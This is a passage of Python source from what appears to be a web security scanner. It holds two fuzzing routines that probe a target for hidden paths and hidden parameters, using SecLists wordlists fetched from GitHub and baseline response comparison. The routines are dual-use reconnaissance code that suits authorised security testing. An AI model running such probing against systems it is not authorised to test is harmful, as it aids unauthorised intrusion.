                    _existing.add(entry)
        except Exception:
            pass

        # ── Baseline for custom-404 detection ───────────────────────
        try:
            canary_resp = self.requester.request(
                f"{base}/atomic_canary_{os.urandom(4).hex()}", 'GET')
            canary_len = len(canary_resp.text) if canary_resp else 0
            canary_status = canary_resp.status_code if canary_resp else 0
        except Exception:
            canary_len = 0
            canary_status = 0

        for path in paths:
            try:
                test_url = f"{base}{path}"
                resp = self.requester.request(test_url, 'GET')
                if not resp:
                    continue
                # Skip custom 404s
                if resp.status_code == canary_status and abs(len(resp.text) - canary_len) < 50:
                    continue
                if resp.status_code in (200, 201, 204, 301, 302, 307, 401, 403):
                    discovered.add(test_url)
            except Exception:
                continue

        if not silent and discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (GitHub Wordlist Discovery)",
                url=url, severity='MEDIUM', confidence=0.7,
                param='N/A',
                payload=', '.join(sorted(discovered)[:15]),
                evidence=(
                    f"Discovered {len(discovered)} endpoints using GitHub-sourced "
                    f"wordlists (SecLists + PayloadsAllTheThings): "
                    f"{'; '.join(sorted(discovered)[:10])}"
                ),
            )
            self.engine.add_finding(finding)

        return discovered

    def _github_param_discover(self, url, *, silent=False):
        """Discover hidden parameters using GitHub-sourced param wordlists.

        Fetches the SecLists ``burp-parameter-names.txt`` wordlist from
        GitHub and probes each parameter against the target, comparing
        responses to a baseline.

        Args:
            url: Target URL.
            silent: If *True*, return param names without emitting findings.

        Returns:
            set[str]: Discovered parameter names.
        """
        discovered = set()

        try:
            from utils.github_wordlists import fetch_wordlist
            gh_params = fetch_wordlist('seclists_params', max_lines=500)
        except Exception:
            gh_params = []

        if not gh_params:
            return discovered

        # Baseline
        try:
            baseline = self.requester.request(url, 'GET')
            baseline_len = len(baseline.text) if baseline else 0
            baseline_status = baseline.status_code if baseline else 0
        except Exception:
            return discovered

        # Skip params already in common_params
        existing = set(self.common_params)
        test_params = [p for p in gh_params if p not in existing and len(p) < 50]

        for param_name in test_params:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=test123"
                resp = self.requester.request(test_url, 'GET')
                if not resp:
                    continue
                if (resp.status_code != baseline_status
                        or abs(len(resp.text) - baseline_len) > 50):
                    discovered.add(param_name)
            except Exception:
                continue

        if not silent and discovered:
            from core.engine import Finding
            finding = Finding(
                technique="Fuzzer (GitHub Param Discovery)",
                url=url, severity='INFO', confidence=0.6,
                param='N/A',
                payload=', '.join(sorted(discovered)[:20]),
                evidence=(
                    f"Discovered {len(discovered)} hidden parameters via "
                    f"GitHub-sourced wordlist (SecLists/burp-parameter-names): "
                    f"{', '.join(sorted(discovered)[:10])}"
                ),
            )
            self.engine.add_finding(finding)

        return discovered
